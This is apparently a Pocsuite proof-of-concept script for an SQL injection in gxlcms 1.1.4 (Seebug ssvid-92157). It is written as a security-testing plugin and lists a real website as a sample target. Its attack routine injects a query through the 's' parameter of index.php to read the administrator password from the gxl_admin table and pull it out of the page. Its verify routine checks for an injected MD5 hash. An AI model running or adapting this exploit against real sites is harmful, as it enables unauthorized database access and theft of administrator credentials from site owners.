import re
import urlparse
from pocsuite.net import req
from pocsuite.poc import POCBase,Output
from pocsuite.utils import register

class TestPOC(POCBase):
    vulID='1571'
    version='1.0'
    author='404notfound'
    vulDate='2016-7-31'
    createDate='2016-7-30'
    updateDate='2016-7-30'
    references=['https://www.seebug.org/vuldb/ssvid-92157']
    name='gxlcms'
    appPowerLink='https://www.gxlcms.com'
    appName='gxlcms'
    appVersion='1.1.4'
    vulType='SQL Injection'
    desc='https://www.seebug.org/vuldb/ssvid-92157'
    samples=['http://www.xin-jian.com/']

    def _attack(self):
        result={}
        vulurl=self.url+'/index.php'
        payload="home-hits-show-sid-admin_pwd from gxl_admin#-type-admin_pwd"
        param={'s':payload}
        resp=req.get(vulurl,params=param)
        if resp.status_code==200:
            match_result=re.search(r'document.write\(\'(.+)\'\)',resp.content)
            if match_result:
                result['AdminInfo']={}
                result['AdminInfo']['Password']=match_result.group(1)    
        return self.parse_attack(result)
    
    def _verify(self):
        result={}
        vulurl=self.url+'/index.php'
        payload="home-hits-show-sid-md5(1) from gxl_admin#-type-md5(1)"
        param={'s':payload}
        resp=req.get(vulurl,params=param)
        if resp.status_code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
            result['VerifyInfo']={}
            result['VerifyInfo']['URL']=vulurl
            result['VerifyInfo']['Payload']=payload
        return self.parse_attack(result)

    def parse_attack(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

        
register(TestPOC)
        
